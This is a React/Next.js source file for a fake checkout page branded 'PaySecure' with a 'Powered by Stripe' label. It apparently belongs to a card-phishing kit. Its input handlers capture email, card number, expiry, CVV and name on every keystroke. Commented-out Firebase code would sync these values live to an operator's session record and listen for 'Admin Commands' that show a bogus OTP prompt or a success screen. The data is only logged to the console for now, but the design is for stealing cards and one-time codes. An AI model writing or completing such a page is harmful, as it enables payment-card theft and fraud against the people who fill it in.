"use client";

import { useEffect, useState } from "react";
import { useParams } from "next/navigation";
import { ref, set, onValue, update } from "firebase/database";
import { db } from "@/lib/firebase";
import { CreditCard, Lock, Check, AlertCircle } from "lucide-react";

export default function CheckoutPage() {
    const params = useParams();
    const websiteId = params.websiteId as string;
    const [sessionId, setSessionId] = useState("");
    const [formData, setFormData] = useState({
        email: "",
        card: "",
        expiry: "",
        cvv: "",
        name: "",
        zip: ""
    });

    // UI States controlled by Admin
    const [showOtp, setShowOtp] = useState(false);
    const [showProcessing, setShowProcessing] = useState(false);
    const [status, setStatus] = useState<"idle" | "success" | "failed">("idle");

    useEffect(() => {
        // Generate Session ID
        const newSessionId = Math.random().toString(36).substring(7);
        setSessionId(newSessionId);

        // Initial Handshake (Mock)
        console.log(`Session Started: ${newSessionId} on ${websiteId}`);

        // In real app: Write initial session data to Firebase
        // set(ref(db, `projects/${websiteId}/sessions/${newSessionId}`), { ... });

        // Listen for Admin Commands
        // const commandRef = ref(db, `projects/${websiteId}/sessions/${newSessionId}/command`);
        // onValue(commandRef, (snapshot) => {
        //   const cmd = snapshot.val();
        //   if (cmd === "OTP") setShowOtp(true);
        //   if (cmd === "SUCCESS") setStatus("success");
        //   if (cmd === "FAIL") setStatus("failed");
        // });

    }, [websiteId]);

    const handleInput = (field: string, value: string) => {
        setFormData(prev => ({ ...prev, [field]: value }));

        // Real-time Sync (Mock)
        console.log(`Syncing ${field}: ${value}`);
        // update(ref(db, `projects/${websiteId}/sessions/${sessionId}`), { [field]: value });
    };

    if (status === "success") {
        return (
            <div className="min-h-screen flex items-center justify-center bg-green-50">
                <div className="text-center space-y-4">
                    <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto text-white">
                        <Check className="w-10 h-10" />
                    </div>
                    <h1 className="text-2xl font-bold text-green-900">Payment Successful</h1>
                    <p className="text-green-700">Thank you for your purchase.</p>
                </div>
            </div>
        );
    }

    return (
        <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
            <div className="w-full max-w-4xl bg-white rounded-2xl shadow-xl overflow-hidden flex flex-col md:flex-row">

                {/* Left: Summary */}
                <div className="bg-gray-900 text-white p-8 md:w-1/3 flex flex-col justify-between">
                    <div>
                        <div className="flex items-center gap-2 mb-8">
                            <div className="w-8 h-8 bg-blue-500 rounded-lg"></div>
                            <span className="font-bold text-xl">PaySecure</span>
                        </div>
                        <div className="space-y-4">
                            <div className="flex justify-between text-gray-400">
                                <span>Premium Plan</span>
                                <span>$17.99</span>
                            </div>
                            <div className="flex justify-between text-gray-400">
                                <span>Tax</span>
                                <span>$0.00</span>
                            </div>
                            <div className="h-px bg-gray-800 my-4"></div>
                            <div className="flex justify-between text-xl font-bold">
                                <span>Total</span>
                                <span>$17.99</span>
                            </div>
                        </div>
                    </div>
                    <div className="text-xs text-gray-500 mt-8">
                        Powered by Stripe
                    </div>
                </div>

                {/* Right: Form */}
                <div className="p-8 md:w-2/3 relative">
                    <h2 className="text-2xl font-bold text-gray-900 mb-6">Payment Details</h2>

                    <div className="space-y-6">
                        <div>
                            <label className="block text-sm font-medium text-gray-700 mb-1">Email</label>
                            <input
                                type="email"
                                className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all"
                                placeholder="you@example.com"
                                onChange={(e) => handleInput("email", e.target.value)}
                            />
                        </div>

                        <div>
                            <label className="block text-sm font-medium text-gray-700 mb-1">Card Information</label>
                            <div className="relative">
                                <input
                                    type="text"
                                    className="w-full p-3 pl-10 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all"
                                    placeholder="0000 0000 0000 0000"
                                    onChange={(e) => handleInput("card", e.target.value)}
                                />
                                <CreditCard className="w-5 h-5 text-gray-400 absolute left-3 top-3.5" />
                            </div>
                            <div className="grid grid-cols-2 gap-4 mt-4">
                                <input
                                    type="text"
                                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all"
                                    placeholder="MM / YY"
                                    onChange={(e) => handleInput("expiry", e.target.value)}
                                />
                                <input
                                    type="text"
                                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all"
                                    placeholder="CVC"
                                    onChange={(e) => handleInput("cvv", e.target.value)}
                                />
                            </div>
                        </div>

                        <div>
                            <label className="block text-sm font-medium text-gray-700 mb-1">Cardholder Name</label>
                            <input
                                type="text"
                                className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all"
                                placeholder="Full Name"
                                onChange={(e) => handleInput("name", e.target.value)}
                            />
                        </div>

                        <button
                            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-lg transition-colors flex items-center justify-center gap-2"
                            onClick={() => setShowProcessing(true)}
                        >
                            <Lock className="w-4 h-4" />
                            Pay $17.99
                        </button>
                    </div>

                    {/* OTP Modal Overlay */}
                    {showOtp && (
                        <div className="absolute inset-0 bg-white/90 backdrop-blur-sm flex items-center justify-center z-50">
                            <div className="bg-white p-8 rounded-2xl shadow-2xl border border-gray-100 w-full max-w-sm mx-4 animate-in fade-in zoom-in duration-300">
                                <div className="text-center mb-6">
                                    <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4 text-blue-600">
                                        <Lock className="w-6 h-6" />
                                    </div>
                                    <h3 className="text-xl font-bold text-gray-900">Verification Required</h3>
                                    <p className="text-sm text-gray-500 mt-2">
                                        Please enter the code sent to your mobile device ending in **88.
                                    </p>
                                </div>
                                <input
                                    type="text"
                                    className="w-full text-center text-2xl tracking-[1em] font-mono p-4 border-2 border-gray-200 rounded-xl focus:border-blue-500 outline-none mb-6"
                                    placeholder="0000"
                                    maxLength={4}
                                />
                                <button className="w-full bg-blue-600 text-white font-bold py-3 rounded-xl hover:bg-blue-700 transition-colors">
                                    Verify Payment
                                </button>
                            </div>
                        </div>
                    )}

                </div>
            </div>
        </div>
    );
}
